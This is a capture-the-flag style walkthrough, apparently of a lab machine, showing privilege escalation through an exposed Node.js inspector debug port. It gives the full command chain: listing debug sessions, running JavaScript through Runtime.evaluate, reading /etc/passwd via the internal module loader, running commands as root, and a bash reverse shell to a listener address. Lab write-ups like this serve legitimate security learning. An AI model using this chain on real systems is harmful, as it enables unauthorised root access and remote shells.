WebSockets are used for persistent two way communication between a client and server over a single TCP connection, allowing both sides to send data in real time without repeatedly opening new HTTP requests.

They are commonly used for things like chat apps, live notifications, multiplayer games, streaming dashboards, and remote debugging protocols like the Node.js inspector you connected to.

This queried the Node.js debugger API to discover active debug sessions and obtain the websocket debugger URL.

```bash
garffff@garffff:~$ curl -s http://127.0.0.1:9229/json/list | jq
[
  {
    "description": "node.js instance",
    "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/62e774f4-2735-46fd-b6e7-55ed512dcc74",
    "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/62e774f4-2735-46fd-b6e7-55ed512dcc74",
    "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
    "id": "62e774f4-2735-46fd-b6e7-55ed512dcc74",
    "title": "/opt/uptime-monitor/worker.js",
    "type": "node",
    "url": "file:///opt/uptime-monitor/worker.js",
    "webSocketDebuggerUrl": "ws://127.0.0.1:9229/62e774f4-2735-46fd-b6e7-55ed512dcc74"
  }
]
```

This connected to the Node.js debugger websocket using the session ID returned by `/json/list`.

```bash
garffff@garffff:~$ wscat -c ws://127.0.0.1:9229/62e774f4-2735-46fd-b6e7-55ed512dcc74
Connected (press CTRL+C to quit)
> 
```

This enabled the Chrome DevTools Runtime API so JavaScript could be executed inside the Node process.

```bash
> {"id":1,"method":"Runtime.enable"}

< {"method":"Runtime.executionContextCreated","params":{"context":{"id":1,"origin":"","name":"/usr/bin/node[1414]","uniqueId":"-3413274413882544535.4944843376627093233","auxData":{"isDefault":true}}}}
< {"method":"Runtime.consoleAPICalled","params":{"type":"log","args":[{"type":"string","value":"uptime-monitor up, pid=1414"}],"executionContextId":1,"timestamp":1779870737644.329,"stackTrace":{"callFrames":[{"functionName":"","scriptId":"81","url":"file:///opt/uptime-monitor/worker.js","lineNumber":73,"columnNumber":8}]}}}
< {"id":1,"result":{}}
```

This executed JavaScript inside the Node process to reveal the Node.js version.

```bash
> {"id":2,"method":"Runtime.evaluate","params":{"expression":"process.version"}}

< {"id":2,"result":{"result":{"type":"string","value":"v20.20.2"}}}
```

This revealed the current working directory of the running Node.js process.

```bash
> {"id":3,"method":"Runtime.evaluate","params":{"expression":"process.cwd()"}}

< {"id":3,"result":{"result":{"type":"string","value":"/"}}}
```

This revealed the main JavaScript file used to start the application.

```bash
> {"id":4,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.filename"}}

< {"id":4,"result":{"result":{"type":"string","value":"/opt/uptime-monitor/worker.js"}}}
```

This enumerated environment variable names available to the Node.js process.

```bash
> {"id":5,"method":"Runtime.evaluate","params":{"expression":"Object.keys(process.env)"}}

< {"id":5,"result":{"result":{"type":"object","subtype":"array","className":"Array","description":"Array(11)","objectId":"-8106030466674083630.1.1"}}}
```

This attempted to use Node's normal `require()` function to read `/etc/passwd`, but failed because `require` was unavailable in that execution context. (Did not work in this example)

```bash
> {"id":6,"method":"Runtime.evaluate","params":{"expression":"require('fs').readFileSync('/etc/passwd','utf8')"}}
> 
< {"id":6,"result":{"result":{"type":"object","subtype":"error","className":"ReferenceError","description":"ReferenceError: require is not defined\n    at <anonymous>:1:1","objectId":"-8106030466674083630.1.2"},"exceptionDetails":{"exceptionId":1,"text":"Uncaught","lineNumber":0,"columnNumber":0,"scriptId":"120","stackTrace":{"callFrames":[{"functionName":"","scriptId":"120","url":"","lineNumber":0,"columnNumber":0}]},"exception":{"type":"object","subtype":"error","className":"ReferenceError","description":"ReferenceError: require is not defined\n    at <anonymous>:1:1","objectId":"-8106030466674083630.1.3"}}}
```

This checked whether `process.mainModule` existed as an alternative path to Node internals.

```bash
{"id":10,"method":"Runtime.evaluate","params":{"expression":"typeof process.mainModule"}}

< {"id":10,"result":{"result":{"type":"string","value":"object"}}}
```

This displayed the Node.js main module object so internal module-loading functionality could be accessed.

```bash
> {"id":11,"method":"Runtime.evaluate","params":{"expression":"process.mainModule"}}

< {"id":11,"result":{"result":{"type":"object","className":"Module","description":"Module","objectId":"-8106030466674083630.1.4"}}}
```

This bypassed the missing `require()` function by using Node's internal module loader to read `/etc/passwd`.

```bash
> {"id":12,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.constructor._load('fs').readFileSync('/etc/passwd','utf8')","returnByValue":true}}

< {"id":12,"result":{"result":{"type":"string","value":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:101:102::/nonexistent:/usr/sbin/nologin\nsystemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\npollinate:x:102:1::/var/cache/pollinate:/bin/false\npolkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\nsyslog:x:103:104::/nonexistent:/usr/sbin/nologin\nuuidd:x:104:105::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:105:107::/nonexistent:/usr/sbin/nologin\ntss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false\nlandscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin\nfwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin\nusbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:109:65534::/run/sshd:/usr/sbin/nologin\nengineer:x:1000:1000:engineer:/home/engineer:/bin/bash\nnode:x:999:988::/home/node:/usr/sbin/nologin\n_laurel:x:996:987::/var/log/laurel:/bin/false\n"}}}
```

This used Node's `child_process` module to execute the Linux `id` command and confirm root command execution.

```bash
> {"id":13,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.constructor._load('child_process').execSync('id').toString()","returnByValue":true}}

< {"id":13,"result":{"result":{"type":"string","value":"uid=0(root) gid=0(root) groups=0(root)\n"}}}
```

This read the root user's flag file directly from disk using the Node filesystem module.

```bash
> {"id":15,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.constructor._load('fs').readFileSync('/root/root.txt','utf8')","returnByValue":true}}

< {"id":15,"result":{"result":{"type":"string","value":"dba32f3ab891f8ed6e12ad297a5a40eb\n"}}}
```

This executed a Bash reverse shell that connected back to your listener and provided interactive root shell access.

```bash
`{"id":16,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.15.107/4444 0>&1\"')","returnByValue":true}}`
```